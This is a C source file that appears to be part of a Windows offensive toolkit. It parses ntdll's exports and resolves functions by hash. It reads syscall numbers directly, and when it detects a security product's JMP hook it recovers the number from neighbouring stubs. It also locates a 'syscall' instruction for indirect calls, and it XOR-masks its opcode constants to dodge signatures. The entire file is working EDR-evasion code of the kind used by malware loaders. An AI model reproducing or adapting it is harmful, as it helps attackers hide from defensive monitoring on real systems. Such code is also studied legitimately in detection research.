#include <Windows.h>

#include "Structures.h"
#include "TrapSyscallsTampering.h"
#include "Utilities.h"
#include "DebugMacros.h"

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#define RANGE       0xFF

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

typedef struct _NTDLL_CONFIG
{
    PDWORD      pdwArrayOfAddresses; 
    PDWORD      pdwArrayOfNames;     
    PWORD       pwArrayOfOrdinals;     
    DWORD       dwNumberOfNames;  
    ULONG_PTR   uModule;             

} NTDLL_CONFIG, * PNTDLL_CONFIG;


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
//
// Global Variables

volatile DWORD  g_dwCleanSysOpcodes     = 0xAAE5DD34;       // 0xB8D18B4C ^ 0x12345678
NTDLL_CONFIG    g_NtdllConf             = { 0 };

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL InitNtdllConfigStructure(IN HMODULE hNtdllModule) 
{
    PPEB                    pPeb           = NULL;
    PLDR_DATA_TABLE_ENTRY   pLdr           = NULL;
    ULONG_PTR               uModule        = NULL;
    PIMAGE_DOS_HEADER       pImgDosHdr     = NULL;
    PIMAGE_NT_HEADERS       pImgNtHdrs     = NULL;
    PIMAGE_EXPORT_DIRECTORY pImgExpDir     = NULL;
    
    if (hNtdllModule) 
        uModule = (ULONG_PTR)hNtdllModule;
   
    if (!uModule) return FALSE;
    
    pImgDosHdr = (PIMAGE_DOS_HEADER)uModule;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    
    pImgNtHdrs = (PIMAGE_NT_HEADERS)(uModule + pImgDosHdr->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) return FALSE;
    
    pImgExpDir = (PIMAGE_EXPORT_DIRECTORY)(uModule + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    if (!pImgExpDir) return FALSE;
    
    g_NtdllConf.uModule             = uModule;
    g_NtdllConf.dwNumberOfNames     = pImgExpDir->NumberOfNames;
    g_NtdllConf.pdwArrayOfNames     = (PDWORD)(uModule + pImgExpDir->AddressOfNames);
    g_NtdllConf.pdwArrayOfAddresses = (PDWORD)(uModule + pImgExpDir->AddressOfFunctions);
    g_NtdllConf.pwArrayOfOrdinals   = (PWORD)(uModule + pImgExpDir->AddressOfNameOrdinals);
    
    return (g_NtdllConf.uModule && 
            g_NtdllConf.dwNumberOfNames && 
            g_NtdllConf.pdwArrayOfNames && 
            g_NtdllConf.pdwArrayOfAddresses && 
            g_NtdllConf.pwArrayOfOrdinals);
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==


BOOL FetchNtSyscall(IN DWORD dwSysHash, OUT PNT_SYSCALL pNtSys) 
{
    PCHAR   pcName          = NULL;
    PBYTE   pbAddr          = NULL;
    PBYTE   pbNeighbor      = NULL;
    PBYTE   pbScan          = NULL;
    BYTE    bHookOffset     = 0;
    
    if (!dwSysHash) return FALSE;
    
    if (!g_NtdllConf.uModule) return FALSE;
    
    pNtSys->dwSyscallHash = dwSysHash;
    
    for (int i = 0; i < g_NtdllConf.dwNumberOfNames; i++) 
    {
        pcName = (PCHAR)(g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfNames[i]);
        
        if (HASH_STRING_A(pcName) != dwSysHash) continue;
        
        pbAddr = (PBYTE)(g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfAddresses[g_NtdllConf.pwArrayOfOrdinals[i]]);
        pNtSys->pSyscallAddress = pbAddr;
        
        // Check if clean syscall: 4C 8B D1 B8 xx xx 00 00
        if (*(ULONG*)pbAddr == (g_dwCleanSysOpcodes ^ 0x12345678) && *(USHORT*)(pbAddr + 0x06) == 0x0000)
        {
            pNtSys->dwSSn = *(USHORT*)(pbAddr + 0x04);
            goto _FIND_DIFF_SYSCAL_ADDR;
        }
        
        // Check for hooks (JMP at +0 or +3)
        bHookOffset = (*pbAddr == 0xE9) ? 0 : (pbAddr[0x03] == 0xE9) ? 0x03 : 0xFF;
        
        if (bHookOffset != 0xFF) 
        {
            // Scan neighbors for clean stub
            for (int wIdx = 1; wIdx <= RANGE; wIdx++) 
            {
                for (int nDir = -1; nDir <= 1; nDir += 2) 
                { 
                    pbNeighbor = pbAddr + (wIdx * nDir * 32);
                    
                    if (*(ULONG*)pbNeighbor == (g_dwCleanSysOpcodes ^ 0x12345678) && *(USHORT*)(pbNeighbor + 0x06) == 0x0000)
                    {
                        pNtSys->dwSSn = *(USHORT*)(pbNeighbor + 0x04) - (wIdx * nDir);
                        goto _FIND_DIFF_SYSCAL_ADDR;
                    }
                }
            }
        }
        break;
    }
    
    if (!pNtSys->pSyscallAddress) return FALSE;
    
_FIND_DIFF_SYSCAL_ADDR:
    pbScan = (PBYTE)pNtSys->pSyscallAddress + 0x50;

    for (int dwI = 0; dwI < RANGE; dwI++) 
    {
        if (*(USHORT*)(pbScan + dwI) == (g_wSyscallOpcode ^ 0x1234))
        { 
            pNtSys->pSyscallInstAddress = (PVOID)(pbScan + dwI);
            return pNtSys->dwSSn && pNtSys->pSyscallInstAddress;
        }
    }
    
    return FALSE;
}

